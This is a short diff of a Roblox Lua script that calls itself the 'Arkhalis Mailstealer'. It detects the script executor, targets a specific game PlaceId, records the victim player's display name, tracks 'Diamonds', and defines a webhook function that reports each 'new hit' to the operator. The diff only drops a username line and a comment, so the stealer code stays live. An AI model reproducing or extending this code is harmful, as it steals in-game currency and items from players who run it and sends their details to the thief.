@@ -1,4 +1,3 @@
---// Executor detector
 local executor = identifyexecutor()
  
 if game.PlaceId == 6284583030 then
@@ -22,7 +21,6 @@ _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
 _G.Diamonds = 0
 local function sendwebhook(msg)
 local msg = {
-  ["username"]= "Arhalis Stealer"
   ["content"]= "**Arkhalis Mailstealer has detected a new hit!**",
   ["embeds"]= {
     {
